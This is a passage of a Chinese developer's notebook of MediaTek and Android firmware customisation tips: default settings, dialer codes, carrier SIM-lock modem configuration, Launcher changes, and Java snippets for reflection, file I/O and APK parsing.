0:表示在无卡的时候当紧急号码；
1:表示始终当紧急号码；
2:表示界面上显示成紧急拨号，但实际以普通方式拨出。
二 、Category属性的设置于语音台选择有关，只有在实际拨打紧急号码的时候会将此号码配置的Category属性发送到Modem。国内默认都是‘0’，国外根据实际情况选择。 

[FAQ21186]  特定运营商紧急号码配置（After Android O）
```

## [暗码] 查看sim卡信息

```text
*#*#4636#*#*
```

## [暗码] 工程模式暗码

```text
sprd     *#*#83781#*#*
mtk      *#*#3646633#*#*
qcom     *#*#4636#*#*
huawei   *#*#2846579#*#*
```

## [知识点] 如何确定全屏时屏幕比例

```text
再 ProjectConfig.mk 文件中搜索LCM，会找到一个宽度和一个高度，然后比一下就会出来全屏的比例！
adb shell wm size
```

## [默认值] 默认声音改成80%

```text
可以打开/frameworks/base/media/java/android/media/AudioService.java，可以发现MAX_STREAM_VOLUME，这个数组里面有各种声音的最大值，STREAM_NOTIFICATION和STREAM_ALARM应该改成80%，然后进入/frameworks/base/media/java/android/media/AudioManager.java，搜索DEFAULT_STREAM_VOLUME，然后把STREAM_RING和STREAM_ALARM改成15x80%=12就可以了
打开mediatek/frameworks/base/media/audio/java/com/mediatek/audioprofile/AudioProfileManager.java，然后搜索DEFAULT_NOTIFICATION_VOLUME_GENERAL和DEFAULT_ALARM_VOLUME_GENERAL，把他们改成15x80%=12就可以了！
```

## [Email] 如何修改邮件帐号类型和邮件签名

```text Java
帐号类型：packages/apps/Email/res/xml/providers.xml（redmine16643）
邮件签名：（redmine30687）
M:mediatek/config/mq16_h504_c5ql/sagereal_copy/packages/apps/Email/UnifiedEmail/src/com/android/mail/compose/ComposeActivity.java  -->appendSignature方法下
if (TextUtils.isEmpty(newSignature)) {
    newSignature  = getString(R.string.email_signature_h504_c5ql);
}
M:mediatek/config/mq16_h504_c5ql/sagereal_copy/packages/apps/Email/src/com/android/email/activity/setup/AccountSettingsFragment.java  -->loadSettings()方法下
if (TextUtils.isEmpty(accountSignature)) {
    accountSignature =getString(R.string.email_signature_h504_c5ql);
} 
M:packages/apps/Email/res/values/mtk_strings.xml
M:packages/apps/Email/res/values-es/mtk_strings.xml
```

## [默认值] 如何使settings/printing/cloud print默认为off

```text Java
frameworks/base/services/java/com/android/server/print/UserState.java  -->  enableSystemPrintServicesOnFirstBootLocked()
if (builder.length() <= 0) {
    return;
}后面加上if (true) return; 
相当于没有寻找到相关设备，默认就会是off 
```

## [默认值] 修改 GPS 默认高精度 high accuracy

```text
frameworks/base/packages/SettingsProvider/res/values/defaults.xml
把 def_location_providers_allowed 设置为 gps,network 然后清理一下 SettingsProvider 的数据或恢复出厂设置就可以了！
```

## [默认值] 修改make passwords visible默认为off

```text
打开frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java，然后查看com.android.providers.settings的数据库（一般你一点击你要修改的项，数据库的最后一项就会自动改变），你找到要修改项的名字，这个项的名字show_password，然后可以看到再loadSystemSettings中没有进行loading，所以加上loadBooleanSetting(stmt, Settings.System.TEXT_SHOW_PASSWORD, R.bool.show_password)（主要是该数据保存存在叫system的table中，所以用loadSystemSettings）;show_password到frameworks/base/packages/SettingsProvider/res/values/defaults.xml里面去加这个字符串，然后值为false
```

## [默认值] 修改unknown sources默认为off

```text
frameworks/base/packages/SettingsProvider/res/values/defaults.xml
def_install_non_market_apps
```

## [默认值] 如何使vibrate默认为on

```text
mediatek/frameworks/base/media/audio/java/com/mediatek/audioprofile/AudioProfileManager.java
DEFAULT_VIBRATION_GENERAL = true;
```

## [默认值] 如何使dial pad touch tones默认为off

```text
mediatek/frameworks/base/media/audio/java/com/mediatek/audioprofile/AudioProfileManager.java
DEFAULT_DTMFTONE_GENERAL = false;
```

## [默认值] screen lock sound默认为off (redmine36401)

```text
mediatek/frameworks/base/media/audio/java/com/mediatek/audioprofile/AudioProfileManager.java
DEFAULT_LOCK_SCREEN_GENERAL = false;
```

## [默认值] 默认语言

```text
mediatek/config/项目名/ProjectConfig.mk
MTK_PRODUCT_LOCALES = en_GB en
```

## 下载DRM的音频文件，使用google play music无法播放，原生音乐app可播放

```text
[FAQ10443]  [Audio App]  DRM下载的音频文件无法使用GMS play music播放。
可修改DrmMtkDef.cpp文件，把有需要打开该格式的的APK名称添加到TRUSTED_APP数组中（比如说用google play music打开该文件，就可以在这个数组里面加上apk名字.注意该apk名字eclipse中的DDMS中显示的apk名字，不是Hierarchy中显示的apk名字），
TRUSTED_APP[TRUSTED_APP_CNT] 这个数组我们要把TRUSTED_APP_CNT也要加上1（可全局搜索TRUSTED_APP_CNT）
同样的，如果是视频文件，也可以使用类似的方式修改，把播放视频APK 添加到TRUSTED_VIDEO_APP中
```

## [log] 信号跳变如何分析

```text
如果是想从log里面看modem上报的信号强度，可以在radio log里面搜 : +ECSQ:，然后看第一个参数的值，如果是99为无效，其他值是越小表示信号强度越弱；
```

## 在修改Preference上的内容之后，不会立刻刷新如何修改

```text
只要在设置好内容之后调用 notifyChanged() 就行了
```

## [Snippet] 获取屏幕密度

```text Java
DisplayMetrics metric = new DisplayMetrics();
getWindowManager().getDefaultDisplay().getMetrics(metric);
int density Dpi = metric.densityDpi;    //屏幕dpi
```

## [Launcher] 如何使桌面去掉没有app的页面

```text
打开/packages/apps/Launcher3/res/values/config.xml，然后把config_workspaceMaxScreenNum改为1（相当于说再其他页都没有app的情况下，launcher最多显示一页，当然如果其他页上面也有app，当然可以多页）
config_workspaceDefaultScreen则表示默认的中间页，也就是按home键回到的那一页！
```

## [OTA] 升级SettingsProvider数据库

```text Java
if (oldVersion <= 43) {
    try {
        db.execSQL("alter table " + Account.TABLE_NAME + " add column " + AccountColumns.IS_START +" integer" + ";");
        final ContentValues cv = new ContentValues(1);
        cv.put(AccountColumns.IS_START, 0);
        db.update(Account.TABLE_NAME, cv, null, null);
    } catch (final SQLException e) {
        // Shouldn't be needed unless we're debugging and interrupt the process
        LogUtils.w(TAG, "Exception upgrading EmailProvider.db from v113 to v114", e);
    }
}
```

## [Snippet] ToggleButton 如何设置背景

```text Java
mSundayButton.setButtonDrawable(getContext().getResources().getDrawable(R.drawable.sunday_4));sunday_4里面可以设置点击和不点击的图片(normal 和 pressed)
```text
在布局文件中可以设置textOn,textOff为空 ，不然的话会在图片上出现on和off字样
android:textOff=""
android:textOn=""
drawable/sunday_4

```text xml
<?xml version="1.0" encoding="UTF-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android" android:exitFadeDuration="@android:integer/config_mediumAnimTime">
    <item android:state_checked="true" android:drawable="@drawable/friday_pressed" />
    <item android:state_checked="false" android:drawable="@drawable/friday_normal" />
</selector>
```

## [默认值] Chrome 第三方浏览器添加书签

```text
packages/providers/PartnerBookmarksProvider/res/values 里面的两个文件进行修改!
```

## [默认值] 如何修改network mode的默认值

```text
frameworks/base/telephony/java/com/android/internal/telephony/RILConstants.java
该文件中的 PREFERRED_NETWORK_MODE 是默认的 network mode 的值！
```

## [Bug] (相机)用闪光灯拍照声音会卡（redmine 20631）

```text
原因：拍照后loading的时候一个cpu不够用，可以直接强制开启两个cpu
[FAQ12541]  拍照时强制开两个CPU
```

## soft touch 左右中快捷键（menu键出现运行的文件）（具体可参考h502s_srf中的redmine 16884）-->虚拟键

```text
frameworks/base/policy/src/com/android/internal/policy/impl/PhoneWindowManager.java，加上keyCode == KeyEvent.KEYCODE_F12的判断
frameworks/base/core/res/res/values/config.xml，然后<integer name="config_longPressOnHomeBehavior">1</integer>改为2，<bool name="config_dreamsEnabledByDefault">true</bool>改为false（config_longPressOnHomeBehavior中的值每个都是有不同意思的，可以到这个文件中去看，那里有注释）
mediatek/custom/up16_sfr_h502s/kernel/touchpanel/GT9XX_V22/tpd_custom_gt9xx.h，把#define GTP_KEY_TAB     {KEY_BACK, KEY_HOMEPAGE, KEY_MENU}改为#define GTP_KEY_TAB     {KEY_BACK, KEY_HOMEPAGE, KEY_F12}
l路径:/alps/kernel-3.10/drivers/input/touchscreen/mediatek/GT9XX_V24，如果在projectConfig.mk中去搜索touchpanel，然后如果发现在前面路径中没有这个touchpanel的文件夹，这时候就需要我们去/sagereal/mk/WQ30_H556_WINONA/sr6735_65u_l1_defconfig文件去中找具体用了哪个touchpanel
M路径：kernel-3.18/arch/arm/boot/dts/sr6580_we_m.dts，在这个里面有个tpd-key-local= <158 172 88 0>;88为F12的值，139为MENU的值

ps：为什么我们不能直接在menu的以前的方法上直接改成另一种方法实现bug的要求呢?那是因为menu里面的方法是不能修改的，不然CTS是过不了的，所以我们直接把KEY_MENU改成了KEY_F12，然后在    PhoneWindowManager.java，加上keyCode == KeyEvent.KEYCODE_F12的判断，这样就会不走keyCode == KeyEvent.KEYCODE_MENU,会直接走keyCode == KeyEvent.KEYCODE_F12
```

## 信号图标的显示（信号的具体的值）

```text
frameworks/base/op/java/com/mediatek/op/telephony/ServiceStateExt.java
```

## [默认值] 修改 VoiceMail number

```text
voicemail number设置
frameworks/opt/telephony/src/java/com/android/internal/telephony/gsm/GSMPhone.java
frameworks/opt/telephony/src/java/com/android/internal/telephony/gsm/SIMRecords.java

主要是再 SIMRecords.java 中的 setVoiceMailByCountry() 方法中把
//mIsVoiceMailFixed = true;  //注释掉此语句以让用户能够修改
isSetByCountry = true; 
voiceMailNum = "*77";
voiceMailTag = "Messagerie vocale";

把 voiceMailNum 和 voiceMailTag 写死
然后把这个方法下面的mVmConfig.containsCarrier(spn)判断方法去掉，该方法是当把voicemail-conf.xml写进common.mk中才能检测到，我们使用简单方法是没有把这个文件写进去的，所以把该判断方法也是去掉的！ 
```

## [bug] 0005636: ITA Vodafone italy PLMN name is wrong（把plmn中的"Voda IT"改成"VODAFONE IT"）

```text
M:mediatek/frameworks/base/telephony/etc/spn-conf.xml，把这个里面的"Voda IT"都改成"VODAFONE IT"
```

## (小部件)电量控制小部件无法从最大亮点切换到自动亮度（redmine 25309）,该问题是再jb3升级到kk时候出现的，原因是jb3上面是没有disable_aal这个参数，而到了kk是有这个参数的，当这个参数为0时才能正常操作

```text
packages/apps/Settings/src/com/android/settings/widget/SettingsAppWidgetProvider.java中
int secureMode = Settings.System.getInt(context.getContentResolver(),Settings.System.DISABLE_AAL);改成int secureMode = Settings.System.getInt(context.getContentResolver(),Settings.System.DISABLE_AAL，0)；
```

## 在 c++ 中引用 ProjectConfig.mk 中定义的宏

```text
详细如下:
AUTO_ADD_GLOBAL_DEFINE_BY_NAME:
如果你希望定义一个宏开关（作为一个功能模块的开关），然后在源文件(*.c/h等使用到这个宏开关)，比如你定义了一个XXX_SUPPORT这个宏的值只有yes和no。那么你可以在
ProjectConfig.mk中定义：
XXX_SUPPORT = yes
但是这样定义在源文件是找不到XXX_SUPPORT的，因此需要加入AUTO_ADD_GLOBAL_DEFINE_BY_NAME，加入之后就可以在源文件使用了，比如aa.c中：
#ifdef XXX_SUPPORT
......
#endif
注意：如果添加的宏的值为no/none/false（无论大小写），那么该宏不会被添加进去。

AUTO_ADD_GLOBAL_DEFINE_BY_VALUE:
同上，但是差别在于你希望将宏的值传给源文件，比如定义了：
XXX_TP = CTP#RTP or CTP
你希望在代码中去判断当前使用了RTP还是CTP，那么可以将XXX_TP加入AUTO_ADD_GLOBAL_DEFINE_BY_VALUE
这样在源文件中就可以引用了，比如aa.c中：
#ifdef CTP
......
#elif RTP
......
#endif

AUTO_ADD_GLOBAL_DEFINE_BY_NAME_VALUE:
它与AUTO_ADD_GLOBAL_DEFINE_BY_NAME差别在于AUTO_ADD_GLOBAL_DEFINE_BY_NAME只有定义和没有定义之分，而AUTO_ADD_GLOBAL_DEFINE_BY_NAME_VALUE还可以知道它的值是多少(注意这个值是字符串)，比如：
XXX_NUM = 1#1 or 2
那么加入AUTO_ADD_GLOBAL_DEFINE_BY_NAME_VALUE之后：
在源文件中就可以这样用(比如aa.c):
if (!strcmp(XXX_NUM, "1")) {
} else {
}
```

## [Recovery] 模式中无法恢复出厂设置，即进入恢复出厂设置没有yes选项（redmine 26513）

```text
bootable/recovery/recovery.cpp，打开该文件const char* items[] 中把第八项往上移（该bug我们是移到第二项），然后把chosen_item != 7改成chosen_item != 1
```

## [bug] 从jb3升级到kk，音量变成原来的一半

```text
因为jb3的音量最大值是7，而kk的最大值是15，所以当jb3存的音量是7时，升上去到kk后7相当于一半的音量
```

## [RTL] 语言设置为阿拉伯语，添加快捷方式至桌面或删除桌面快捷图标，待机界面会先显示一下第二页再显示主页面（redmine 26599）

```text
关于redmine 26599这个问题是在由于阿拉伯语显示的时候从右往左引起的，而我们其他的语言一般都是从左到右显示的
修改方法：/ddm/packages/apps/Launcher3/AndroidManifest.xml中的com.android.launcher3.LauncherApplication上有个android:supportsRtl="true"这个支持从右往左的功能，所以把这句话去掉就可以了，阿拉伯语的launcher也会从左往右    就不会这个问题了！
```

## [bug]  [27043] 日历中的事件不能通过蓝牙分享

```text
打开packages/apps/Bluetooth/src/com/android/bluetooth/opp/Constants.java文件，然后 ACCEPTABLE_SHARE_INBOUND_TYPES = new String[]  中加上"text/x-vcalendar",在UNACCEPTABLE_SHARE_INBOUND_TYPES = new String[] 中去掉"text/x-vcalendar",这样我们手机就可以通过蓝牙分享接收了，但是分享出去的话只能是同样这样修改的手机才可以！
```

## [锁网] SIM ME lock

```text
 一、首先是要下载对应的modem代码，通过shengjun的ppt里面的方法，把该锁的运营商给锁起来（custom/service/nvram/custom_nvram_sec.c这个文件中去锁网的时候最好用一个宏去控制下，做到一个项目一个宏，比如说加个宏 __UP11_DDM_A35_EI_SINGLE_TELMA_SIM_LOCK__，然后还要去定义这个宏，那么就要进入make/文件夹中，然后按照其他项目建一个自己项目的.mak文件，再该文件中去定义前面的宏，再该.mak文件中的CUSTOM_OPTION +=后面加上宏），然后用./make.sh .mak(新加的.mak文件) new去编译这个modem，然后按照excel表格去把需要的文件拿出来放到mediatek/custom/common/modem/中
ps：如果是升级下载的话必须还要修改modem的东西，不然的话升级下载后还是没有锁网现象，修改方法
1、trunk/service/nvram/src/nvram_io.c这个文件中加上
#if !defined(__SFR_H502S_SIMUNLOCK__) && !defined(__UP11_DDM_A35_EI_SINGLE_TELMA_SIM_LOCK__)
    EXT_ASSERT(KAL_FALSE, DISPLAY_ERROR(status), NVRAM_LOC_WRITE_IMPORTANT_DATA_FAIL, ldi->LID);
    return status;
#endif
#if !defined(__H5_MTN_SIMLOCK__) && !defined(__UP11_DDM_A35_EI_SINGLE_TELMA_SIM_LOCK__)
    EXT_ASSERT(KAL_FALSE, DISPLAY_ERROR(status), NVRAM_LOC_READ_IMPORTANT_DATA_FAIL, ldi->LID);
#endif
#if !defined(__H5_MTN_SIMLOCK__) && !defined(__UP11_DDM_A35_EI_SINGLE_TELMA_SIM_LOCK__)
    EXT_ASSERT(KAL_FALSE, DISPLAY_ERROR(status), NVRAM_LOC_RESTORE_SUCCESS_READ_FAIL, ldi->LID);(这句话是在kk的版本上必须修改的，不然OTA方式升级没有问题，升级下载方式升级会出问题)
#endif
（具体可以参照kk的modem）
2、trunk/interface/service/nvram/nvram_editor_data_item.h中NVRAM_EF_SML_LID_VERNO加上1，同时用自己modem的宏控制下，
如#elif defined （__UP09L_H401_DDM_SINGLE_SIMLOCK__）
#define NVRAM_EF_SML_LID_VERNO               "008"
二、除了上述的需要修改外还要在上层代码中打开SAGEREAL_SIM_ME_LOCK_SUPPORT = yes
```

## 开机状态下拔下电池再插上电池，会自动开机

```text
该功能是kk新加的功能，短时间掉电后会自动开机，因此不用修改
```

## Sim卡中的通话记录与NVRAM中通话记录的关系

```text
下面通过几个关键点来介绍：
1.Sim卡和NVRAM里面都存放有通话记录，但是Sim卡由于容量限制只存放已拨记录，并且已拨记录只包含名字和号码。
2.当我们进入通话记录菜单的时侯，显示出来的通话记录是从NVRAM里读出来的，当我们产生一个新的通话时，通话记录也是更新到NVRAM里面去。
3.Sim卡的通话记录和NVRAM里面的通话记录会进行同步,这个同步的做法是,关机的时候会把NVRAM的已拨通话记录更新到Sim卡里面去,开机的时候,会先判断Sim卡是否更换，如果更换了，则会删除手机的通话记录，然后将Sim卡的通话记录复制到NVRAM里面。
4.Sim卡通话记录与NVRAM通话记录的同步是可以改变的，在10A上可以通过宏CFG_MMI_CLOG_SIM_SYNC_SUPPORT来控制，但是在10A之前没有类似的宏，所以需要手动修改代码。关机时候的同步过程是在phb_sync_handler里面完成的，所以只需定义__PHB_NVRAM_LN_ONLY__就可以免去这个过程；开机过程的同步是在phb_startup_erase_ln完成的，只要在函数前面加上两条语句直接返回即可：phb_init_ln_confirm(PHB_ERRNO_SUCCESS, control_block);
return;
```

## [snippet] 在 Launcher 上隐藏某个应用

```text
一、如果有APK的源码，只需修改AndroidManifest.xml文件
<activity
    android:name=".Calculator"
    android:label="@string/app_name"
    android:windowSoftInputMode="stateAlwaysHidden">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />   <!--去掉此行-->
        <category android:name="android.intent.category.APP_CALCULATOR" />
    </intent-filter>
</activity>


二、如果不能修改apk的源码，修改Launcher的代码
1. 请修改 LauncherModel.java 的loadAllApps()方法，如下：
    // Create the ApplicationInfos
    for (int i = 0; i < apps.size(); i++) {
        LauncherActivityInfoCompat app = apps.get(i);
        // This builds the icon bitmaps.
        mBgAllAppsList.add(new AppInfo(mContext, app, user, mIconCache, quietMode));
    }
    //mtk add begin
    mBgAllAppsList.removePackage("PackageName",user,true);
    mBgAllAppsList.added.removeAll(mBgAllAppsList.removed);
    mBgAllAppsList.removed.clear();
    //PackageName为要隐藏的包名
    //mtk add end
}
......
2. 请在LauncherModel.java的PackageUpdatedTask的run()方法开头，将mPackages变量中要求不显示的package name移除掉。 
```

## [bug] 快捷方式不能更新

```text
快捷方式不能更新
72KK与82KK有一个共性问题，某些老版本的apk在安装后第一次打开会在Idle界面自动生成一个快捷方式，然后更新此apk，发现自动生成的这个快捷方式图标未更新，QQ新老版本就有这个问题存在；
纠其原因，是因为apk自己生成的那个虽然与应用程序图标相同，但却是一个shortcut，而我们手动拖出来放在桌面上的却是application，而源码中只判断了application，因此造成了这个现象的产生；
现已经在所有KK分支中上传；

该问题并不是很严重，目前只发现QQ满足以下三点：
1.新老版本图标不同
2.打开后会自动在桌面生成图标
3.生成的图标是shortcut类型的
如后续客户在他们自己使用apk的过程中发现了该问题，还请集成组同时更新以下代码：
packages/apps/Launcher3/src/com/android/launcher3/Workspace.java
packages/apps/Launcher2/src/com/android/launcher2/Workspace.java
```

## 如何修改某些plmn(plmn = mcc+mnc)的一些漫游或者显示的文件

```text
/frameworks/opt/telephony/src/java/com/android/internal/telephony/gsm/GsmServiceStateTracker.java
N:frameworks/opt/telephony/src/java/com/android/internal/telephony/ServiceStateTracker.java
哪些PLMN（MCC+MNC）想不显示roaming图标就可以在 customEhplmn 中加上该主运营商和虚拟运营商的plmn就可以了（如果要把某个虚拟运营商去掉roaming图标，也要把主运营商的plmn加上去）
如果要去获取主运营商和虚拟运营商，可以早radio.log中去搜索plmn
MVNO(Mobile Virtaul Network Operator)虚拟网络运营商，没有自己的实体网络，通过租用MNO(Mobile Network Operator)的网络来提供网络服务
[FAQ10438]  [NW] 如何设定忽略国内漫游 ---> SIM卡的MCC跟网络MCC相同时，默认设定不属于漫游，不需要修改。如果需要修改，按照该FAQ，每个平台修改方法不同
```

## [默认值] 默认亮度

```text
/frameworks/base/packages/SettingsProvider/res/values/defaults.xml
def_screen_brightness
def_screen_brightness_automatic_mode
```

## [信息] 在收到内容只有一个“=”的信息后，手机自动重启（redmine 9870）

```text
原因：
01-01 03:11:31.515 501 517 E AndroidRuntime: *** FATAL EXCEPTION IN SYSTEM PROCESS: android.server.ServerThread
01-01 03:11:31.515 501 517 E AndroidRuntime: java.lang.RuntimeException: Error receiving broadcast Intent { act=android.provider.Telephony.SMS_RECEIVED flg=0x10 (has extras) } in com.android.server.location.GpsLocationProvider$6@41676700
01-01 03:11:31.515 501 517 E AndroidRuntime: at android.app.LoadedApk$ReceiverDispatcher$Args.run(LoadedApk.java:798)
01-01 03:11:31.515 501 517 E AndroidRuntime: at android.os.Handler.handleCallback(Handler.java:800)
01-01 03:11:31.515 501 517 E AndroidRuntime: at android.os.Handler.dispatchMessage(Handler.java:100)
01-01 03:11:31.515 501 517 E AndroidRuntime: at android.os.Looper.loop(Looper.java:194)
01-01 03:11:31.515 501 517 E AndroidRuntime: at com.android.server.ServerThread.run(SystemServer.java:1303)
01-01 03:11:31.515 501 517 E AndroidRuntime: Caused by: java.lang.ArrayIndexOutOfBoundsException: length=0; index=0
01-01 03:11:31.515 501 517 E AndroidRuntime: at com.android.server.location.GpsLocationProvider.gpsTestMessageParser(GpsLocationProvider.java:1902)
01-01 03:11:31.515 501 517 E AndroidRuntime: at com.android.server.location.GpsLocationProvider.access$2400(GpsLocationProvider.java:98)
01-01 03:11:31.515 501 517 E AndroidRuntime: at com.android.server.location.GpsLocationProvider$6.onReceive(GpsLocationProvider.java:1861)
01-01 03:11:31.515 501 517 E AndroidRuntime: at android.app.LoadedApk$ReceiverDispatcher$Args.run(LoadedApk.java:788)
01-01 03:11:31.515 501 517 E AndroidRuntime: ... 4 more
说明上述原因是数组越界
修改：frameworks/base/services/java/com/android/server/location/GpsLocationProvider.java中
```

## [Snippet]  [prop]  [反射] 通过反射调用 SystemProperties

```text
Class clazz = Class.forName("android.os.SystemProperties");  -->通过具体类名获取到具体的类
Method method = clazz.getMethod("get", String.class);   -->通过上面拿到的类获取到get方法（String.class是参数的类型，相当于后面的"internal_sd_path"的类型）
String path = (String) method.invoke(clazz, "internal_sd_path"); -->通过上面的类和方法获取到该方法运行后的结果（其中"internal_sd_path"为get里面的参数）
等同于
String path = SystemProperties.get("internal_sd_path");
Log.e("test", path);

ps：有时候google把某些类的方法给@hide了，这就导致我们在其他apk上无法拿到这个方法，这时候就要用到反射
@hide在新的sdk版本上越来越少，因为google会对每一个@hide的方法进行多次验证，如果验证完全没问题了就会把@hide给去掉

// 反射模板
public static public String getProperty(String key, String defaultValue) {
    String value = defaultValue;
    try {
        Class<?> c = Class.forName("android.os.SystemProperties");
        Method get = c.getMethod("get", String.class, String.class);
        value = (String)(get.invoke(c, key, "unknown" ));
    } catch (Exception e) {
        e.printStackTrace();
    }finally {
        return value;
    }
}
```

## [Snippet]  [prop] 如何获取到phone storage的路径

```text Java
String path = SystemProperties.get("internal_sd_path")，L、M上不可用
```

## [Snippet] 解析apk包中的文件列表

```text Java
public static void readZipFile2(File file) { 
    try { 
        ZipFile zipfile = new ZipFile(file); //创建ZipFile对象
        System.out.println(zipfile.getName()); //打印Zip文件路径
        System.out.println("ZIP条目数：" + zipfile.size()); //打印Zip文件条目数
        Enumeration<? extends ZipEntry> en = zipfile.entries(); 
        ZipEntry entry; 
        while (en.hasMoreElements()) { 
            entry = (ZipEntry) en.nextElement(); 
            System.out.println(entry.getName()); 
        } 
        zipfile.close(); 
    } catch(ZipException e) { 
        System.out.println(file.getName() + "压缩文件错误"); 
    } catch(IOException e) { 
        System.out.println(file.getName() + "读取文件时出错"); 
    } 
}
```

## [Snippet] 解析apk包中的lib库，并打印到终端

```text
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.zip.ZipEntry;
import java.util.zip.ZipException;
import java.util.zip.ZipFile;

public class ParseApk {
 public static void main(String[]  args) {
  //System.out.println("args0:"+args[0] );
  if (args == null || args.length == 0 || args[0]  == null || !args[0] .endsWith(".apk")) {
   System.out.println("Please input right apk path!");
   return;
  }
  
  ArrayList<String> libNames = parseLibFiles(new File(args[0] ));
  System.out.println("# add to Android.mk");
  for (String libName : libNames) {
   System.out.println("#################### " + libName + " begin ####################");
   System.out.println("include $(CLEAR_VARS)");
   System.out.println("LOCAL_MODULE := " + libName);
   System.out.println("LOCAL_SRC_FILES := lib/" + libName + ".so");
   System.out.println("LOCAL_MODULE_CLASS := SHARED_LIBRARIES");
   System.out.println("LOCAL_MODULE_TAGS := optional");
   System.out.println("LOCAL_MODULE_SUFFIX := .so");
   System.out.println("LOCAL_MODULE_PATH := $(PRODUCT_OUT)/system/lib");
   System.out.println("include $(BUILD_PREBUILT)");
   System.out.println("#################### " + libName + " end   ####################");
   System.out.println();
  }
  System.out.println();
  System.out.println();
  System.out.println();
  System.out.println();
  System.out.println();
  System.out.println();
  System.out.println();
  System.out.println("# add to common.mk");
  for(String libName:libNames){
   System.out.println("PRODUCT_PACKAGES += " + libName);
  }
 }

 public static ArrayList<String> parseLibFiles(File file) {
  ArrayList<String> libNames = new ArrayList<String>();
  try {
   ZipFile zipfile = new ZipFile(file); // 创建ZipFile对象
   // System.out.println(zipfile.getName()); // 打印Zip文件路径
   // System.out.println("ZIP条目数：" + zipfile.size()); // 打印Zip文件条目数
   Enumeration<? extends ZipEntry> en = zipfile.entries();
   ZipEntry entry;
   while (en.hasMoreElements()) {
    entry = (ZipEntry) en.nextElement();
    String entryName = entry.getName();
    if (entryName.contains("lib") && entryName.endsWith(".so")) {
     String libName = entryName.substring(entryName.lastIndexOf("/") + 1).replaceAll(".so", "");
     libNames.add(libName);
    }
   }
   zipfile.close();
  } catch (ZipException e) {
   System.out.println(file.getName() + "压缩文件错误");
  } catch (IOException e) {
   System.out.println(file.getName() + "读取文件时出错");
  }
  return libNames;
 }
}

已经编译打包成 jar 包 parselib.jar
使用方法 java -jar parlib.jar xxx.apk
```

## [Snippet] Collections.sort() 排序

```text Java
Collections.sort排序
Collections.sort(appsPackageName, comparator);
举例：
ArrayList<String> aa = new ArrayList<String>();
aa.add("1");
aa.add("2");
Collections.sort(aa, comparator );
Comparator<? super String> comparator =  new Comparator<String>() {
    public int compare(String lhs, String rhs) {
        return Integer.valueOf(lhs)-Integer.valueOf(rhs);
    }
};
aa是什么类型的list，那么comparator的方法的参数就是什么类型的，比如说这个是string的list，那么生成的方法的参数就是String类型的，但是该方法返回的是一个int
如果你要排序某些string的数组，那么可以给每个string中做个数字的排序，
HashMap<String, String> hashMap = new HashMap<String, String>();
hashMap.put("packageName","aa");
hashMap.put("index", "1");
ArrayList<HashMap<String, String>> appsPackageName =  new ArrayList<HashMap<String,String>>();
appsPackageName.add(hashMap);
相当于把string中的东西放到hashMap上，然后同时在hashMap中加上一个标记位，然后标记位去通过Collections.sort(aa, comparator );进行比较
```

## 如何使data/nvram中的东西备份到bin区

```text
打开 mediatek/custom/common/cgen/CFG_file_info.c 或 mediatek/external/nvram/libcustom_nvram/CFG_file_info.c 文件，然后找到aBackupToBinRegion[] 这一个数组
把要备份到bin区写到这里，然后刷IMEI触动备份即可
```

## [FAQ08623] 如何在滑动解锁界面添加“紧急拨号”按钮

```text
如需在滑动解锁界面添加“紧急拨号”，请修改EmergencyButton.java文件onFinishInflate()方法，将mIsSecure = mLockPatternUtils.isSecure()改为 mIsSecure = true。
```

## [默认值] 怎样延长锁屏界面显示时间?

```text
屏灭状态，按power键，显示锁屏界面，然后又进入灭屏状态，现在显示锁屏界面，到又进入灭屏状态大概5s，怎样延长该时间到15s。
修改 KeyguardViewMediator.java 中的 KEYGUARD_LOCK_AFTER_DELAY_DEFAULT 的值
```

## [需求] (Factory Mode)All the menus should be in English

```text
MTK_FACTORY_MODE_IN_GB2312=no
```

## [Snippet] IO流文件读写模板

```text Java
//读取文件方法1：
private String path = "/sys/devices/platform/pcbid/pcbid"
File file = new File(path);
BufferedReader bufferedReader = null;
if (file.exists()) {
    try {
        bufferedReader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
        bufferedReader.readLine();
        .....
    } catch (FileNotFoundException e1) {
        e1.printStackTrace();
    }catch (IOException e) {
        e.printStackTrace();
    }
}

读取文件方法2：
private boolean proc_read_flash_light() {
    FileInputStream fileinputstream = null;
    byte abyte0[]  = new byte[3] ;
    try {
        File procFile = new File("/proc/torch_config");
        if (procFile.exists() && procFile.canRead()) {
            fileinputstream = new FileInputStream(procFile);
            fileinputstream.read(abyte0);
        }
    } catch (Exception e) {
        e.printStackTrace();
    } finally {
        try {
            if (fileinputstream != null) {
                fileinputstream.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    return abyte0[2]  == 0x31 ? true : false;
}
    
写入文件方法1：
final File file = new File("/storage/sdcard0/jcb.txt");
try {
    FileOutputStream fileOutputStream = new FileOutputStream(file);
    fileOutputStream.write(aa.getBytes());
    fileOutputStream.close();
} catch (FileNotFoundException e) {
    e.printStackTrace();
} catch (IOException e) {
    e.printStackTrace();
}

写入文件方法2：
private void proc_write_flash_light(boolean state) {
    FileOutputStream fileoutputstream=null;
        
    byte abyte0[]  = new byte[1] ;
    if(state)
        abyte0[0]  = 0x31;
    else
        abyte0[0]  = 0x30;
        
    try {
        File procFile = new File("/proc/torch_config");
        if(procFile.exists() && procFile.canWrite()) {
            fileoutputstream = new FileOutputStream(procFile);
            fileoutputstream.write(abyte0);
            fileoutputstream.flush();
        }
    } catch (Exception e) {
        e.printStackTrace();
    } finally{
        try {
            if(fileoutputstream != null){
                fileoutputstream.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

ps：新建文件的方法
private String path = "/sys/devices/platform/pcbid/pcbid";
File file = new File(path);
file.createNewFile();当然当使用new FileOutputStream(file)方法的时候也是会默认新建文件到指定路径的
```

## [Snippet] 如何使屏幕不灭屏

```text Java
getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);-->保持屏幕不灭屏
```

## [Snippet]  [log] 无法抓取log时将log写入到文件中的方法

```text Java
public static void log(String tag, String str) {
    File file = null;
    try {
        file = new File("storage/sdcard0/log.txt");
        if(!file.exists()) {
            file.createNewFile();
        }
    } catch (IOException e1) {
        e1.printStackTrace();
    }
    if (file == null) {
        return;
    }
    FileWriter fw = null;
    try {
        fw = new FileWriter(file, true);
